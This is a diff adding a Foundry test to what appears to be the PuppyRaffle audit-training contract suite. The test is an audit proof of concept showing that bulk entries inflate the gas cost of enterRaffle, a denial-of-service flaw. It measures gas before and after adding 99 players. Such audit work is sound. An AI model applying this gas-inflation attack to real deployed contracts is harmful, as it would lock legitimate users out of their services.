@@ -213,4 +213,41 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
+
+
+    // AUDIT PoC
+    function testDoSAttackOnEnterRaffle() public { 
+        vm.txGasPrice(1);     
+        uint256 playersToAdd = 99;
+
+        // measure initial gas
+        address[] memory initialPlayers = new address[](1);
+        initialPlayers[0] = address(1);
+        uint256 initialGas = gasleft();
+        puppyRaffle.enterRaffle{ value: entranceFee }(initialPlayers);
+        uint256 initialGasUsed = initialGas - gasleft();
+        
+        // Perform DoS
+        address[] memory DoSPlayers = new address[](playersToAdd);
+        for(uint256 i = 0; i<DoSPlayers.length; i++) {
+            DoSPlayers[i] = address(i+2);
+        }
+        puppyRaffle.enterRaffle{ value: entranceFee * playersToAdd }(DoSPlayers);
+
+        // measure final gas 
+        address[] memory finalPlayers = new address[](1);
+        finalPlayers[0] = address(101);
+        uint256 finalInitialGas = gasleft();
+        puppyRaffle.enterRaffle{ value: entranceFee }(finalPlayers);
+        uint256 PostAttackGasUsed = finalInitialGas - gasleft();
+
+        // asserts
+        assert(initialGasUsed<PostAttackGasUsed);
+
+        console.log("initial gas used:", initialGasUsed);
+        console.log("post attack gas used:", PostAttackGasUsed);
+        console.log("gas used incresed in a factor of aprox.", PostAttackGasUsed/initialGasUsed, " after attack");
+    }
+
+
 }
